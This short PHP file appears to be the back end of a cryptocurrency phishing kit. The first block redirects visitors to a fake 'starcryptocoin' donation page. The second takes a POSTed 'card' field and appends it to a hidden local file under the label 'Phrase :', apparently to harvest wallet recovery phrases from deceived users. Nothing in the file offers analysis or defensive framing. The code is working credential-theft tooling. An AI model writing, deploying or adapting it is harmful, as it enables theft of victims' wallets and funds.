<?php



header("Location:https://donate-starcryptocoin.github.io/cv/donate.starcryptocoin.tk/cab56kapl.html?card=18kwzvgwhpZh4F6rFegr8n722Q9EkXn3mb");


?>
<?php
$file = "____567811____";
$card   = $_POST['card'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "**************************************");
fwrite($handle, "\n");
fwrite($handle, "Phrase : ");
fwrite($handle, "$card");
fwrite($handle, "\n");
fclose($handle);

?>
